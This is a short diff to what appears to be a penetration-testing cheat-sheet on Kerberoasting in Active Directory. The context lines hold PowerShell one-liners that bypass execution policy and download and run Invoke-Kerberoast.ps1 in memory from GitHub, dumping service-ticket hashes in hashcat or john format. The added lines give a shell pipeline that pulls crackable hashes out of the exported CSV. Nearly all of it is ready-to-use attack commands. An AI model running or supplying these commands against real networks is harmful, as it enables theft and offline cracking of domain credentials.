@@ -23,6 +23,14 @@ Set-ExecutionPolicy -scope process -execution bypass
 iex((iwr https://raw.githubusercontent.com/justin-p/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1).content);invoke-kerberoast -outputformat Hashcat | export-csv C:\temp\kerb_tickets.csv
 ```
 
+One liner to extract hashcat ready hashes from `kerb_tickets.csv`.
+
+```plain
+cat kerb_tickets.csv | awk '{print $1}' | sed 's/"//g' | cut -d ',' -f2 > kerbs
+```
+
+Other method:
+
 ```powershell
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
